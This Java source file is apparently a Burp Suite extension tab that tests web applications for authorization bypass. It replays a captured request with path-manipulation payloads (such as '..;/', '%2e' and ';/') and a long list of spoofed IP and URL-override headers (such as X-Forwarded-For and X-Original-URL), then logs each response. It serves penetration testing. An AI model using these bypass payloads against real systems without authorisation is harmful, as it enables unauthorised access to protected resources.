package burp.ui;

import burp.*;
import burp.bean.Auth;
import burp.utils.Utils;

import javax.swing.*;
import javax.swing.table.AbstractTableModel;
import javax.swing.table.TableModel;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Objects;


import static burp.utils.Utils.helpers;

public class AuthUI extends AbstractTableModel implements UIHandler, IMessageEditorController {
    public IBurpExtenderCallbacks callbacks;
    private static final List<AuthUI.LogEntry> log = new ArrayList<>();
    private IHttpRequestResponse currentlyDisplayedItem;
    private IMessageEditor HRequestTextEditor;
    private IMessageEditor HResponseTextEditor;
    @Override
    public void init() {

    }

    @Override
    public JPanel getPanel(IBurpExtenderCallbacks callbacks) {
        this.callbacks = callbacks;
        JPanel jp=new JPanel(new BorderLayout());
        JSplitPane mSplitPane = new JSplitPane(JSplitPane.VERTICAL_SPLIT); // 主分隔面板

        JTable urlTable = new AuthUI.URLTable(AuthUI.this);
        JScrollPane jScrollPane = new JScrollPane(urlTable); // 滚动条

        JSplitPane xjSplitPane = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT); // 请求与响应界面的分隔面板

        JTabbedPane ltable = new JTabbedPane();
        HRequestTextEditor = callbacks.createMessageEditor(AuthUI.this, true);
        ltable.addTab("Request", HRequestTextEditor.getComponent());

        JTabbedPane rtable = new JTabbedPane();
        HResponseTextEditor = callbacks.createMessageEditor(AuthUI.this, false);
        rtable.addTab("Response", HResponseTextEditor.getComponent());

        xjSplitPane.setLeftComponent(ltable);
        xjSplitPane.setRightComponent(rtable);

        xjSplitPane.setResizeWeight(0.5); // 设置调整权重为 0.5，使两个面板的宽度一样

        jp.add(xjSplitPane);


        JButton refershbutton = new JButton("刷新");
        refershbutton.addActionListener(new AbstractAction() {
            @Override
            public void actionPerformed(ActionEvent e) {
                fireTableDataChanged();
            }
        });
        JButton deletebutton = new JButton("删除选中");
        deletebutton.addActionListener(new AbstractAction() {
            @Override
            public void actionPerformed(ActionEvent e) {
                HResponseTextEditor.setMessage(new byte[0], true);
                HRequestTextEditor.setMessage(new byte[0], true);
                int[] rows = urlTable.getSelectedRows();
                for (int i = rows.length - 1; i >= 0; i--) {
                    int row = urlTable.convertRowIndexToModel(rows[i]);
                    log.remove(row);
                    fireTableRowsDeleted(row, row);
                    fireTableDataChanged();
                }
            }
        });

        JButton deleteallbutton = new JButton("删除全部");
        deleteallbutton.addActionListener(new AbstractAction() {
            @Override
            public void actionPerformed(ActionEvent e) {
                HResponseTextEditor.setMessage(new byte[0], true);
                HRequestTextEditor.setMessage(new byte[0], true);
                log.clear();
                fireTableDataChanged();
            }
        });

        mSplitPane.add(jScrollPane, "left");
        mSplitPane.add(xjSplitPane, "right");

        JSplitPane buttonSplitPane = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT);
        JPanel buttonPanel = new JPanel(new GridLayout(1, 3));
        buttonPanel.add(refershbutton);
        buttonPanel.add(deletebutton);
        buttonPanel.add(deleteallbutton);
        buttonSplitPane.setTopComponent(buttonPanel);
        jp.add(buttonSplitPane, BorderLayout.NORTH);


        jp.add(mSplitPane);
        return jp;
    }

    public void CheckAuthBypass(IHttpRequestResponse[] responses) {
        IHttpRequestResponse baseRequestResponse = responses[0];
        IRequestInfo analyzeRequest = Utils.helpers.analyzeRequest(baseRequestResponse);
        String method = analyzeRequest.getMethod();
        String path = analyzeRequest.getUrl().getPath();
        String request = Utils.helpers.bytesToString(baseRequestResponse.getRequest());
        String url = analyzeRequest.getUrl().toString();
        List<String> headers = Utils.helpers.analyzeRequest(baseRequestResponse).getHeaders();
        String urlWithoutQuery = "";
        try {
            URL url1 = new URL(url);
            String protocol = url1.getProtocol(); // 获取协议部分，这里是 http
            String host = url1.getHost(); // 获取主机名部分，这里是 192.168.11.3
            int port = url1.getPort(); // 获取端口号部分，这里是 7001
            urlWithoutQuery = protocol + "://" + host + ":" + port;
        } catch (MalformedURLException e) {
            throw new RuntimeException(e);
        }
        List<Auth> authRequests = new ArrayList<>();
        authRequests.addAll(prefix(method, path));
        authRequests.addAll(suffix(method, path));

        if (Objects.equals(method, "GET") || Objects.equals(method, "POST")) {
            for (Auth value : authRequests) {
                if (Objects.equals(value.getMethod(), "GET")) {
                    String new_request = request.replaceFirst(path, value.getPath());
                    IHttpRequestResponse response = Utils.callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), Utils.helpers.stringToBytes(new_request));
                    String requrl = urlWithoutQuery + value.getPath();
                    String statusCode = String.valueOf(Utils.helpers.analyzeResponse(response.getResponse()).getStatusCode());
                    String length = String.valueOf(response.getResponse().length);
                    add(method, requrl, statusCode, length, response);
                } else if (Objects.equals(value.getMethod(), "POST")) {
                    String new_request = request.replaceFirst(path, value.getPath());
                    IHttpRequestResponse response = Utils.callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), Utils.helpers.stringToBytes(new_request));
                    String requrl = urlWithoutQuery + value.getPath();
                    String statusCode = String.valueOf(Utils.helpers.analyzeResponse(response.getResponse()).getStatusCode());
                    String length = String.valueOf(response.getResponse().length);
                    add(method, requrl, statusCode, length, response);
                }
            }
            // 增加header payload 测试
            List<Auth> testHeaders = headers(method, url);
            byte[] byte_Request = baseRequestResponse.getRequest();
            int bodyOffset = analyzeRequest.getBodyOffset();
            int len = byte_Request.length;
            byte[] body = Arrays.copyOfRange(byte_Request, bodyOffset, len);

            for (Auth header : testHeaders) {
                headers.add(header.getHeaders());
            }
            byte[] message = Utils.helpers.buildHttpMessage(headers, body);
            IHttpRequestResponse response = Utils.callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), message);
            // 发送请求
            String statusCode = String.valueOf(Utils.helpers.analyzeResponse(response.getResponse()).getStatusCode());
            String length = String.valueOf(response.getResponse().length);
            add(method, url, statusCode, length, response);
        }
    }

    public static List<Auth> suffix(String method, String path) {
        if (path.startsWith("//")) {
            path = "/" + path.substring(2).replaceAll("/+", "/");
        }
        List<Auth> authRequests = new ArrayList<>();
        if (path.endsWith("/")) {
            path = path.substring(0, path.length() - 1);
            List<String> payloads = Arrays.asList(path + "%2e/", path + "/.", "./" + path + "/./", path + "%20/",
                    "/%20" + path + "%20/", path + "..;/", path + "?", path + "??", "/" + path + "//",
                    path + "/", path + "/.randomstring");
            for (String payload : payloads) {
                if ("GET".equals(method)) {
                    authRequests.add(new Auth("GET", payload, ""));
                } else if ("POST".equals(method)) {
                    authRequests.add(new Auth("POST", payload, ""));
                }
            }
        } else {
            List<String> payloads = Arrays.asList(path + "/%2e", path + "/%20", path + "%0d%0a", path + ".json", path + "/.randomstring");

            for (String payload : payloads) {
                if ("GET".equals(method)) {
                    authRequests.add(new Auth("GET", payload, ""));
                } else if ("POST".equals(method)) {
                    authRequests.add(new Auth("POST", payload, ""));
                }
            }
        }
        return authRequests;
    }

    public static List<Auth> prefix(String method, String path) {
        if (path.startsWith("//")) {
            path = "/" + path.substring(2).replaceAll("/+", "/");
        }
        List<Auth> authRequests = new ArrayList<>();
        String[] prefix = {";/", ".;/", "images/..;/", ";a/", "%23/../"};
        for (String s : prefix) {
            // 将路径按 / 分割为多个部分
            String[] pathParts = path.split("/");
            for (int i = 1; i < pathParts.length; i++) {
                // 输出从第二个部分到最后一个部分
                String[] subPathParts = Arrays.copyOfRange(pathParts, i, pathParts.length);
                String[] prePathParts = Arrays.copyOfRange(pathParts, 1, i);
                if (prePathParts.length > 0) {
                    if ("GET".equals(method)) {
                        authRequests.add(new Auth("GET", "/" + String.join("/", prePathParts) + "/" + s + String.join("/", subPathParts), ""));
                    }
                    else if ("POST".equals(method)){
                        authRequests.add(new Auth("POST","/"+String.join("/", prePathParts) + "/" + s + String.join("/", subPathParts),""));
                    }
                } else {
                    if ("GET".equals(method)){
                        authRequests.add(new Auth("GET","/"+s + String.join("/", subPathParts),""));
                    } else if ("POST".equals(method)) {
                        authRequests.add(new Auth("POST", "/" + s + String.join("/", subPathParts), ""));
                    }
                }
            }
        }

        return authRequests;
    }

    public static List<Auth> headers(String method, String url) {
        List<Auth> authRequests = new ArrayList<>();
        List<String> payloads = Arrays.asList("Access-Control-Allow-Origin: 127.0.0.1","Base-Url: " + url,"CF-Connecting-IP: 127.0.0.1",
                "CF-Connecting_IP: 127.0.0.1","Client-IP: 127.0.0.1","Cluster-Client-IP: 127.0.0.1","Destination: 127.0.0.1",
                "Forwarded-For-Ip: 127.0.0.1","Forwarded-For: 127.0.0.1","Forwarded-Host: 127.0.0.1","Forwarded: 127.0.0.1",
                "Http-Url: " + url,"Origin: 127.0.0.1","Profile: 127.0.0.1","Proxy-Host: 127.0.0.1",
                "Proxy-Url: " + url,"Proxy: 127.0.0.1","Real-Ip: 127.0.0.1","Redirect: 127.0.0.1","Referer: " + url,
                "Request-Uri: 127.0.0.1","True-Client-IP: 127.0.0.1",
                "Uri: "+ url,"Url: " + url,"X-Arbitrary: 127.0.0.1","X-Client-IP: 127.0.0.1",
                "X-Custom-IP-Authorization: 127.0.0.1","X-Forward-For: 127.0.0.1",
                "X-Forward: 127.0.0.1","X-Forwarded-By: 127.0.0.1",
                "X-Forwarded-For-Original: 127.0.0.1","X-Forwarded-For: 127.0.0.1",
                "X-Forwarded-Host: 127.0.0.1","X-Forwarded-Proto: 127.0.0.1",
                "X-Forwarded-Server: 127.0.0.1","X-Forwarded: 127.0.0.1",
                "X-Forwarder-For: 127.0.0.1","X-Host: 127.0.0.1",
                "X-HTTP-DestinationURL: " + url,"X-HTTP-Host-Override: 127.0.0.1",
                "X-Original-Remote-Addr: 127.0.0.1","X-Original-URL: " + url,"X-Originally-Forwarded-For: 127.0.0.1",
                "X-Originating-IP: 127.0.0.1","X-Proxy-Url: " + url,"X-ProxyUser-Ip: 127.0.0.1","X-Real-IP: 127.0.0.1",
                "X-Real-Ip: 127.0.0.1","X-Referrer: 127.0.0.1","X-Remote-Addr: 127.0.0.1","X-Remote-IP: 127.0.0.1",
                "X-Rewrite-URL: " + url,"X-True-IP: 127.0.0.1","X-WAP-Profile: 127.0.0.1");

        for (String payload : payloads) {
            if ("GET".equals(method)) {
                authRequests.add(new Auth("GET","",payload));
            }else if ("POST".equals(method)){
                authRequests.add(new Auth("POST","",payload));
            }
        }
        return authRequests;
    }

    private void add(String method, String url, String statuscode, String length, IHttpRequestResponse baseRequestResponse) {
        synchronized (log){
            int id = log.size();
            log.add(new LogEntry(id, method, url, statuscode, length, baseRequestResponse));
            fireTableRowsInserted(id, id);
            fireTableDataChanged();
        }
    }


    @Override
    public String getTabName() {
        return "Authcheck";
    }

    @Override
    public IHttpService getHttpService() {
        return currentlyDisplayedItem.getHttpService();
    }

    @Override
    public byte[] getRequest() {
        return currentlyDisplayedItem.getRequest();
    }

    @Override
    public byte[] getResponse() {
        return currentlyDisplayedItem.getResponse();
    }

    @Override
    public int getRowCount() {
        return log.size();
    }

    @Override
    public int getColumnCount() {
        return 5;
    }

    @Override
    public Object getValueAt(int rowIndex, int columnIndex) {
        switch (columnIndex){
            case 0:return log.get(rowIndex).id;
            case 1:return log.get(rowIndex).method;
            case 2:return log.get(rowIndex).url;
            case 3:return log.get(rowIndex).status;
            case 4:return log.get(rowIndex).length;
            default:return null;
        }
    }

    @Override
    public String getColumnName(int column) {
        switch (column){
            case 0:return "id";
            case 1:return "method";
            case 2:return "url";
            case 3:return "status";
            case 4:return "length";
            default:return null;
        }
    }

    private class URLTable extends JTable{
        public URLTable(TableModel dm) {
            super(dm);
        }

        @Override
        public void changeSelection(int row, int col, boolean toggle, boolean extend) {
            AuthUI.LogEntry logEntry = log.get(row);
            HRequestTextEditor.setMessage(logEntry.requestResponse.getRequest(), true);
            if (logEntry.requestResponse.getResponse() == null) {
                HResponseTextEditor.setMessage(new byte[0], false);
            } else {
                HResponseTextEditor.setMessage(logEntry.requestResponse.getResponse(), false);
            }
            currentlyDisplayedItem = logEntry.requestResponse;
            super.changeSelection(row, col, toggle, extend);
        }
    }


    private static class LogEntry {
        private int id;
        private String method;
        private String url;
        private String status;
        private String length;
        private IHttpRequestResponse requestResponse;

        public LogEntry() {
        }

        public LogEntry(int id, String method, String url, String status, String length, IHttpRequestResponse requestResponse) {
            this.id = id;
            this.method = method;
            this.url = url;
            this.status = status;
            this.length = length;
            this.requestResponse = requestResponse;
        }
    }
}
